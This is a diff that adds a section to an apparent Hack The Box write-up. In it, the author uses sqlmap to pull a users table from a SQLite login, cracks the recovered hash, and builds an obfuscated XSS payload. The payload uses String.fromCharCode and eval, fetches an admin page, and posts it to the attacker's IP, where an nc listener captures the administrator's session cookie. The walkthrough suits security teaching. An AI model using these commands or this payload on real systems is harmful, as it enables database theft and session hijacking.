@@ -73,6 +73,56 @@ Upgrade-Insecure-Requests: 1
 username=admin&password=admin
 ```
 
+### Sqlmap
+
+Try to use sqlmap to brute force the login request. Due to the awful network or something, sqlmap is slow for me to use for the boxed in hack the box. So try to prefer get some important inpotant information instead of dump all information in sqlmap. For example, obtain tables firstly. Then dig into the interesting table.
+
+```
+sqlmap -r sql.req --level=5 --risk=3 --tables --threads=5
+```
+
+[![Ejdcss.md.png](https://s2.ax1x.com/2019/05/19/Ejdcss.md.png)](https://imgchr.com/i/Ejdcss)
+
+By sqlmap, it seems that the database is SQLite and there are 5 tables. The `users` table is interesting. There may are some valid user and password. 
+
+```
+sqlmap -r sql.req --level=5 --risk=4 -T users --threads=10
+```
+
+![Ej4acR.png](https://s2.ax1x.com/2019/05/19/Ej4acR.png)
+
+A user is found. [Hashkiller](https://hashkiller.co.uk/Cracker) is a wonderful hash crack online tool. The hash can be cracked easily.
+
+![Ej464e.png](https://s2.ax1x.com/2019/05/19/Ej464e.png)
+
+Login with this user. It seems to be a booking website.
+
+![Ej4Lgs.png](https://s2.ax1x.com/2019/05/19/Ej4Lgs.png)
+
+Click any booking and see the booking details. It consits of two tabs, including View and Notes. In the Notes, one word is interesting: "All notes must be approved by an administrator - this process can take up to 1 minute." Administrator is always attractive to hackers. It seems that the note will be approved by administrator. So it's possible to steal the session cokie of administrator if there is a xss vulnerability in the note edit form. I think it's the hardest part of this box. It's not easy to find the approprivate pass way. There is a way to utilize `fromCharCode` and other skills to pass the xss filter. The following javascript code is utilized to generate the payload:
+
+```javascript
+var url = 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65';
+var str = `$.ajax({method:'GET',url:'${url}',success:function(data){$.post('http://10.10.16.65',data)}})`;
+console.log(str);
+result = "";
+for (var i = 0; i < str.length; i++) {
+  result += str.charCodeAt(i) + ',';
+}
+result = result.substr(0, result.length - 1);
+console.log(result);
+var payload = `<img src="x/><script>eval(String.fromCharCode(${result}));</script>">`;
+console.log(payload);
+```
+
+Set kali listen to port 80: `nc -lvnp 80`. The code can be run in the chrome dev. Input the generated payload into the note, wait a minute the data will be sent to kali. 
+
+![Ej5nUO.png](https://s2.ax1x.com/2019/05/19/Ej5nUO.png)
+
+admin cookie
+
+![Ej4oE8.png](https://s2.ax1x.com/2019/05/19/Ej4oE8.png)
+
 
 ```javascript
 var url = 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65';
